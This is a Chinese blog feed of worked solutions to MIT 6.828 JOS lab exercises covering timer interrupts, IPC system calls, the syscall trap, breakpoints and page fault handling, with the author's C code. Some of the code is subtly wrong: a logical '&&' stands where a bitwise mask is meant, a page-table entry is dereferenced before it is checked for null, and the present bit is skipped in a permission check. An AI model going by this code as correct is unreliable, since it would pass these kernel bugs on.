Interrupts</h4><p>目前程序一旦进入用户模式，除非发生中断，否则CPU永远不会再执行内核代码。我们需要开启时钟中断，强迫进入内核，然后内核就可以切换另一个进程执行。<br>lapic_init()和pic_init()设置时钟中断控制器产生中断。需要写代码来处理中断。</p><p><strong>exercise14</strong></p><p>修改内核的trap_dispatch()函数，使其在发生时钟中断时调用 sched_yield()以查找并运行不同的环境。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handle clock interrupts. Don&#x27;t forget to acknowledge the</span></span><br><span class="line"><span class="comment">// interrupt using lapic_eoi() before calling the scheduler!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>(tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_TIMER)&#123;</span><br><span class="line">lapic_eoi();</span><br><span class="line">sched_yield();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时make grade ，我们能够得到65/80。</p><h3 id="Inter-Process-communication-IPC"><a href="#Inter-Process-communication-IPC" class="headerlink" title="Inter-Process communication (IPC)"></a>Inter-Process communication (IPC)</h3><p>到目前为止，我们都在做隔离的事情。操作系统另一个重要的内容是允许程序相互交流。</p><h4 id="IPC-in-JOS"><a href="#IPC-in-JOS" class="headerlink" title="IPC in JOS"></a>IPC in JOS</h4><p>我们将要实现sys_ipc_recv()和sys_ipc_try_send()这两个系统调用，来实现进程间通信。并且实现两个包装函数ipc_recv()和 ipc_send()。<br>JOS中进程间通信的“消息”包含两部分：</p><ol><li>一个32位的值。</li><li>可选的页映射关系。</li></ol><h4 id="Sending-and-Receiving-Messages"><a href="#Sending-and-Receiving-Messages" class="headerlink" title="Sending and Receiving Messages"></a>Sending and Receiving Messages</h4><p>sys_ipc_recv()和sys_ipc_try_send()是这么协作的：</p><ol><li>当某个进程调用sys_ipc_recv()后，该进程会阻塞（状态被置为ENV_NOT_RUNNABLE），直到另一个进程向它发送“消息”。当进程调用sys_ipc_recv()传入dstva参数时，表明当前进程准备接收页映射。</li><li>进程可以调用sys_ipc_try_send()向指定的进程发送“消息”，如果目标进程已经调用了sys_ipc_recv()，那么就发送数据，然后返回0，否则返回-E_IPC_NOT_RECV，表示目标进程不希望接受数据。当传入srcva参数时，表明发送进程希望和接收进程共享srcva对应的物理页。如果发送成功了发送进程的srcva和接收进程的dstva将指向相同的物理页</li></ol><p><strong>exercise15</strong></p><p>首先是两个系统调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_ipc_try_send(<span class="keyword">envid_t</span> envid, <span class="keyword">uint32_t</span> value, <span class="keyword">void</span> *srcva, <span class="keyword">unsigned</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_ipc_try_send not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">rcvenv</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = envid2env(envid,&amp;rcvenv,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret) <span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span>(!rcvenv-&gt;env_ipc_recving) <span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(srcva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_lookup(curenv-&gt;env_pgdir,srcva,&amp;pte);</span><br><span class="line"></span><br><span class="line"><span class="comment">//按注释顺序</span></span><br><span class="line"><span class="keyword">if</span>(srcva != ROUNDDOWN(srcva,PGSIZE)) <span class="keyword">return</span> -E_INVAL;<span class="comment">//不是页对齐</span></span><br><span class="line"><span class="keyword">if</span>((*pte &amp; perm) != perm) <span class="keyword">return</span> -E_INVAL; <span class="comment">//权限问题 perm应该是要包含于*pte中的</span></span><br><span class="line"><span class="keyword">if</span> (!pp) <span class="keyword">return</span> -E_INVAL; <span class="comment">//src物理页未映射</span></span><br><span class="line"><span class="keyword">if</span>((perm &amp; PTE_W) &amp;&amp; !(*pte &amp; PTE_W)) <span class="keyword">return</span> -E_INVAL; <span class="comment">//没有写权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(rcvenv-&gt;env_ipc_dstva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line">ret = page_insert(rcvenv-&gt;env_pgdir,pp,rcvenv-&gt;env_ipc_dstva,perm);<span class="comment">//共享相同的映射关系</span></span><br><span class="line"><span class="keyword">if</span>(ret) <span class="keyword">return</span> ret;</span><br><span class="line">rcvenv-&gt;env_ipc_perm = perm;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//send successed and update the target&#x27;s ipc</span></span><br><span class="line">rcvenv-&gt;env_ipc_recving = <span class="number">0</span>;<span class="comment">//标记接受进程可再次接受信息</span></span><br><span class="line">rcvenv-&gt;env_ipc_from = curenv-&gt;env_id;</span><br><span class="line">rcvenv-&gt;env_ipc_value = value;</span><br><span class="line">rcvenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">rcvenv-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_ipc_recv(<span class="keyword">void</span> *dstva)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_ipc_recv not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(dstva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line"><span class="keyword">if</span>(dstva != ROUNDDOWN(dstva,PGSIZE))&#123;</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">curenv-&gt;env_ipc_recving = <span class="number">1</span>;</span><br><span class="line">curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">curenv-&gt;env_ipc_dstva = dstva;</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把他们封装给用户态</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ipc_send(<span class="keyword">envid_t</span> to_env, <span class="keyword">uint32_t</span> val, <span class="keyword">void</span> *pg, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;ipc_send not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pg = (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">r = sys_ipc_try_send(to_env,val,pg,perm);</span><br><span class="line"><span class="keyword">if</span>(r == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//发送成功</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(r == -E_IPC_NOT_RECV)&#123;<span class="comment">//接受进程为准备好</span></span><br><span class="line">sys_yield();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">panic(<span class="string">&quot;ipc_send(): %e\n&quot;</span>,r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span></span><br><span class="line">ipc_recv(<span class="keyword">envid_t</span> *from_env_store, <span class="keyword">void</span> *pg, <span class="keyword">int</span> *perm_store)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;ipc_recv not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pg = (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r = sys_ipc_recv(pg);</span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>)&#123; <span class="comment">//error</span></span><br><span class="line"><span class="keyword">if</span>(from_env_store) *from_env_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(perm_store) *perm_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(from_env_store)&#123;</span><br><span class="line">*from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(perm_store)&#123;</span><br><span class="line">*perm_store = thisenv-&gt;env_ipc_perm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IPC总结图如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_5_IPC%E5%8E%9F%E7%90%86.png" alt="JOS IPC原理"></p><p>这里其实是有两个功能，传值和映射共同地址，但是映射地址的功能不一定是要用上的，具体怎么操作看代码和注释吧，注释写得挺详细的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13884924720/0" alt="image-20210815165636781"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本实现主要是围绕进程这个概念来展开的，主要介绍四部分：</p><ol><li><p><strong>支持多处理器</strong>。现代的处理器一般都是多核的，并且会有多个处理器，这样每个CPU能同时允许不同的进程，实现并行。。需要用锁解决多CPU的竞争。 CPU和进程在内核中的数据结构如下图所示：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_2_cpu%E5%92%8CEnv%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="Env和CpuInfo关系"></p></li><li><p><strong>实现进程调度</strong>。 一种是非抢占式式的，另一种是抢占式的，借助时钟中断实现，时钟中断到来时，内核调用sched_yield()选择另一个Env结构执行。</p></li><li><p><strong>实现写时复制fork</strong>(进程创建)。fork是库函数，会调用sys_exofork这个系统调用，该系统调用在内核中为子进程创建一个新的Env结构，然后将父进程的寄存器状态复制给该Env结构，复制页表，对于PTE_W为1的页表，复制的同时，设置PTE_COW标志。为父进程和子进程设置缺页处理函数，处理逻辑就是：当缺页中断发生是因为写时拷贝的地址，分配一个新的物理页，然后将该虚拟地址映射到新的物理页。</p><p>原理图上面有</p></li><li><p><strong>实现进程间通信</strong>。本质还是进入内核修改Env结构的页映射关系。原理图见上。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在lab4中多了如下文件：kern/cpu.h、kern/mpconfig.c、kern/lapic.c、kern/mpentry.S、kern/spinlock.h、kern/spinlock.c、kern/sched.c&lt;/p&gt;
&lt;h2 id=&quot;Part-A-Multi
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise9</title>
    <link href="https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/"/>
    <id>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/</id>
    <published>2021-08-06T15:31:41.615Z</published>
    <updated>2021-08-06T16:55:45.787Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改kern/trap.c文件，使其能够实现：当在内核模式下发现页错，trap.c 文件会panic。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目要求我们在检测到这个 page fault 是出现在内核态时，要把这个事件 panic 出来，所以我们把 page_fault_handler 文件修改如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_fault_handler(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs &amp;&amp; <span class="number">0x1</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">panic(<span class="string">&quot;page fault in kernel-mode,fault address %d\n&quot;</span>,fault_va);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据题目的要求，我们还要继续完善 kern/pmap.c 文件中的 user_mem_assert , user_mem_check 函数，通过观察 user_mem_assert 函数我们发现，它调用了 user_mem_check 函数。而 user_mem_check 函数的功能是检查一下当前用户态程序是否有对虚拟地址空间 [va, va+len] 的 perm| PTE_P 访问权限。</p><p>自然我们要做的事情应该是，先找到这个虚拟地址范围对应于当前用户态程序的页表中的页表项，然后再去看一下这个页表项中有关访问权限的字段，是否包含 perm | PTE_P，只要有一个页表项是不包含的，就代表程序对这个范围的虚拟地址没有 perm|PTE_P 的访问权限。以上就是这段代码的大致思想</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">user_mem_check(struct Env *env, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">cprintf(<span class="string">&quot;user_mem_check va: %x, len: %x\n&quot;</span>, va, len);</span><br><span class="line"><span class="keyword">char</span> *begin = ROUNDDOWN((<span class="keyword">char</span> *)va,PGSIZE);</span><br><span class="line"><span class="keyword">char</span> *end = ROUNDUP((<span class="keyword">char</span> *)(va + len),PGSIZE);</span><br><span class="line"><span class="keyword">pte_t</span> * cur_pte = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(;begin &lt; end ; begin += PGSIZE)&#123;</span><br><span class="line">cur_pte = pgdir_walk(env-&gt;env_pgdir,(<span class="keyword">void</span> *)begin,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">int</span>)begin &gt; ULIM || cur_pte == <span class="literal">NULL</span> || ((<span class="keyword">uint32_t</span>)(*cur_pte) &amp; perm) != perm)&#123;</span><br><span class="line">user_mem_check_addr = (begin &lt; (<span class="keyword">uint32_t</span>)va ? (<span class="keyword">uint32_t</span>)va : begin);<span class="comment">//记录无效的虚拟地址</span></span><br><span class="line">            <span class="keyword">return</span> -E_FAULT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后按照题目要求我们还要补全 kern/syscall.c 文件中的一部分内容，即 sys_cputs 函数，这个函数要求检查用户程序对虚拟地指空间 [s, s+len] 是否有访问权限，所以我们恰好可以使用刚刚写好的函数 user_mem_assert() 来实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">sys_cputs(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check that the user has permission to read memory [s, s+len).</span></span><br><span class="line"><span class="comment">// Destroy the environment if not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">user_mem_assert(curenv,s,len,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Print the string supplied by the user.</span></span><br><span class="line">cprintf(<span class="string">&quot;%.*s&quot;</span>, len, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们就完成了这个练习，可以运行一下 make run-buggyhello，看一下它是否按照题目的要求输出了信息。</p><p>其实 Exercise 9 完成后，Exercise 10 其实也完成了，你可以直接运行 make run-evilhello，看一下是否输出要求的结果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改kern/trap.c文件，使其能够实现：当在内核模式下发现页错，trap.c 文件会panic。&lt;/p&gt;
&lt;h3 id=&quot;分析&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise7</title>
    <link href="https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/"/>
    <id>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/</id>
    <published>2021-08-06T08:07:46.281Z</published>
    <updated>2021-08-08T15:43:47.366Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>给中断向量T_SYSCALL编写一个中断处理函数。我们需要去编辑kern/trapentry.S和kern/trap.c中的trap_init函数。也需要去修改trap_dispatch()函数，使他能够通过调用syscall()(在kern/syscall.h中定义)函数处理系统调用中断。最终你需要去实现kern/syscall.c中的syscall函数。确保这个函数会在系统调用号为非法值时返回-E_INVAL。我们应该充分理解lib/syscall.c文件。我们要处理在inc/syscall.h文件中定义的所有系统调用。通过make run-hello指令来运行 user/hello 程序，它应该在控制台上输出 “hello, world” 然后出发一个页中断。如果没有发生的话，代表你编写的系统调用处理函数是不正确的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们需要了解一下系统调用的整个流程，如果现在运行的是内核态的程序的话，此时调用了一个系统调用，比如 sys_cputs 函数时，此时不会触发中断，那么系统会直接执行定义在 lib/syscall.c 文件中的 sys_cputs，我们可以看一下这个文件，可以发现这个文件中定义了几个比较常用的系统调用，包括 sys_cputs, sys_cgetc 等等。我们还会发现他们都是统一调用一个 syscall 函数，通过这个函数的代码发现其实它是执行了一个汇编指令。所以最终是这个函数完成了系统调用。</p><p>以上是运行在内核态下的程序，调用系统调用时的流程。</p><p>但是如果是用户态程序呢？这个练习就是让我们编写程序使我们的用户程序在调用系统调用时，最终也能经过一系列的处理最终去执行 lib/syscall.c 中的 syscall 指令。</p><p>让我们看一下这个过程，当用户程序中要调用系统调用时，比如 sys_cputs，从它的汇编代码中我们会发现，它会执行一个 int $0x30 指令，这个指令就是软件中断指令，这个中断的中断号就是 0x30，即 T_SYSCALL，所以题目中让我们首先为这个中断号编写一个中断处理函数，我们首先就要在 kern/trapentry.S 文件中为它声明它的中断处理函数，即TRAPHANDLER_NOEC，就像我们为其他中断号所做的那样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(t_divide, T_DIVIDE)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(t_syscall, T_SYSCALL)</span><br></pre></td></tr></table></figure><p>然后在trap.c 文件中声明 t_syscall() 函数。并且在 trap_init() 函数中为它注册</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern/trap.c</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_fperr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_align</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_mchk</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_simderr</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_syscall</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">trap_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line">    </span><br><span class="line">        .....</span><br><span class="line">    SETGATE(idt[T_ALIGN], <span class="number">0</span>, GD_KT, t_align, <span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[T_MCHK], <span class="number">0</span>, GD_KT, t_mchk, <span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[T_SIMDERR], <span class="number">0</span>, GD_KT, t_simderr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    SETGATE(idt[T_SYSCALL], <span class="number">0</span>, GD_KT, t_syscall, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Per-CPU setup </span></span><br><span class="line">    trap_init_percpu();</span><br></pre></td></tr></table></figure><p>此时当系统调用中断发生时，系统就可以捕捉到这个中断了，中断发生时，系统就会压入error code和trapno然后jump到_alltraps去执行，并且最终来到trap()函数处，进入trap函数后，经过一系列处理进入 trap_dispatch 函数。题目中要求此时我们需要去调用 kern/syscall.c 中的syscall函数，这里注意，这个函数可不是 lib/syscall.c 中的 syscall 函数。</p><p>我们修改我们的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_SYSCALL) &#123;</span><br><span class="line">tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx,</span><br><span class="line">tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, tf-&gt;tf_regs.reg_esi);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后修改我们kern/syscall.c中的syscall函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span></span><br><span class="line">syscall(<span class="keyword">uint32_t</span> syscallno, <span class="keyword">uint32_t</span> a1, <span class="keyword">uint32_t</span> a2, <span class="keyword">uint32_t</span> a3, <span class="keyword">uint32_t</span> a4, <span class="keyword">uint32_t</span> a5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> (SYS_cputs):</span><br><span class="line">sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span>*)a1,a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> (SYS_cgetc):</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> (SYS_getenvid):</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> (SYS_env_destroy):</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回顾一下系统调用的完成流程：以user/hello.c为例，其中调用了cprintf()，注意这是lib/print.c中的cprintf，该cprintf()最终会调用lib/syscall.c中的sys_cputs()，sys_cputs()又会调用lib/syscall.c中的syscall()，该函数将系统调用号放入%eax寄存器，五个参数依次放入in DX, CX, BX, DI, SI，然后执行指令int 0x30，发生中断后，去IDT中查找中断处理函数，最终会走到kern/trap.c的trap_dispatch()中，我们根据中断号0x30，又会调用kern/syscall.c中的syscall()函数（注意这时候我们已经进入了内核模式CPL=0），在该函数中根据系统调用号调用kern/print.c中的cprintf()函数，该函数最终调用kern/console.c中的cputchar()将字符串打印到控制台。当trap_dispatch()返回后，trap()会调用<code>env_run(curenv);</code>，该函数前面讲过，会将curenv-&gt;env_tf结构中保存的寄存器快照重新恢复到寄存器中，这样又会回到用户程序系统调用之后的那条指令运行，只是这时候已经执行了系统调用并且寄存器eax中保存着系统调用的返回值。任务完成重新回到用户模式CPL=3。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;给中断向量T_SYSCALL编写一个中断处理函数。我们需要去编辑kern/trapentry.S和kern/trap.c中的trap_ini
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise6</title>
    <link href="https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise6/"/>
    <id>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise6/</id>
    <published>2021-08-06T05:26:10.781Z</published>
    <updated>2021-08-08T15:43:20.869Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改trap_dispatch()使断点异常发生时，能够触发kernel monitor。修改完成后运行 make grade，运行结果应该是你修改后的 JOS 能够正确运行 breakpoint 测试程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个练习其实和上一个练习是类似的，只不过是在这里我们需要处理断点中断 (T_BRKPT)，kernel monitor 就是定义在 kern/monitor.c 文件中的 monitor 函数，所以修改后的程序如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> 